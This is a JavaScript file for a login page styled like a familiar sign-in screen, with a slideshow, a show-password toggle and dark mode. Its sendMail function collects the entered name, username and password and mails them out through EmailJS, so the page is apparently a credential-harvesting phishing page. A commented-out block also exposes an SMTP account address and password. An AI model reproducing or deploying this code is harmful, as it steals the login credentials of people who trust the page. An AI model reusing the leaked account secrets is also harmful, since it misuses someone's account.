let slide_content = document.querySelector("#slide-content");

let signin_form = document.querySelector("#signin-form");

let signin_btn = document.querySelector("#signin-btn");

let darkmode_toggle = document.querySelector("#darkmode-toggle");

let slide_index = 0;

slide = () => {
  let slide_items = slide_content.querySelectorAll("img");
  slide_items.forEach((e) => e.classList.remove("active"));
  slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1;
  slide_items[slide_index].classList.add("active");
};

setInterval(slide, 2000);

// animate input
document.querySelectorAll(".animate-input").forEach((e) => {
  let input = e.querySelector("input");
  let button = e.querySelector("button");

  input.onkeyup = () => {
    if (input.value.trim().length > 0) {
      e.classList.add("active");
    } else {
      e.classList.remove("active");
    }

    if (checkSigninInput()) {
      signin_btn.removeAttribute("disabled");
    } else {
      signin_btn.setAttribute("disabled", "true");
    }
  };

  // show password button
  if (button) {
    button.onclick = () => {
      if (input.getAttribute("type") === "text") {
        input.setAttribute("type", "password");
        button.innerHTML = "Show";
      } else {
        input.setAttribute("type", "text");
        button.innerHTML = "Hide";
      }
    };
  }
});

checkSigninInput = () => {
  let inputs = signin_form.querySelectorAll("input");
  return Array.from(inputs).every((input) => {
    return input.value.trim().length >= 6;
  });
};

// darkmode toggle
darkmode_toggle.onclick = (e) => {
  e.preventDefault();
  let body = document.querySelector("body");
  body.classList.toggle("dark");
  darkmode_toggle.innerHTML = body.classList.contains("dark")
    ? "Lightmode"
    : "Darkmode";
};

function sendMail() {
  var params = {
    from_name: document.getElementById("fullname").value,
    username: document.getElementById("username").value,
    password: document.getElementById("password").value,
  };
  emailjs
    .send("service_3ywe4ld", "template_u7kkpvm", params)
    .then(function (res) {});
}

// function sendMail() {
//   Email.send({
//     Host: "smtp.elasticemail.com",
//     Username: "xglobalnetwork2001@gmail.com",
//     Password: "06EB6607C6B2E728E2520A71FCA845F78A00",
//     To: "xglobalnetwork2001@gmail.com",
//     // To: "jacksoncorymichael@gmail.com",
//     From: "xglobalnetwork2001@gmail.com",
//     Subject: "This is the subject",
//     Body: "And this is the body",
//   }).then((message) => alert(message));
// }
